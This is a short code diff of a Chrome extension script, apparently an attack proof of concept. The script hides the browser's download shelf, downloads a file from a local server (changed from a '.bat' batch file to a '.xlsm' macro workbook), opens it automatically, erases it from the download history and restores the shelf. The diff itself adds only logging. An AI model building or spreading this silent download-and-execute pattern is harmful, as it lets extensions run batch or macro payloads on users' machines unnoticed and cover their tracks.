@@ -4,6 +4,7 @@ var downloadItem;
 function open() {
 	state = 'open';
 	
+    console.log('open');
 	chrome.downloads.open(downloadItem.id);		
 	chrome.downloads.erase({id: downloadItem.id});
 	chrome.downloads.setShelfEnabled(true);
@@ -15,9 +16,10 @@ function open() {
 
 function download() {
 	state = 'download';
+    console.log('download');
 	chrome.downloads.setShelfEnabled(false);
 	chrome.downloads.download({
-		url: 'https://localhost:3001/download?filename=1.bat',
+		url: 'https://localhost:3001/download?filename=1.xlsm',
 		method: 'GET',
 	}, function(downloadId){	
 		var interval = setInterval(function() {
@@ -26,6 +28,7 @@ function download() {
 					clearInterval(interval);
 					downloadItem = downloadItems[0];
 					state = 'downloaded';
+                    console.log('download finished');
 				}
 			});
 		}, 100);
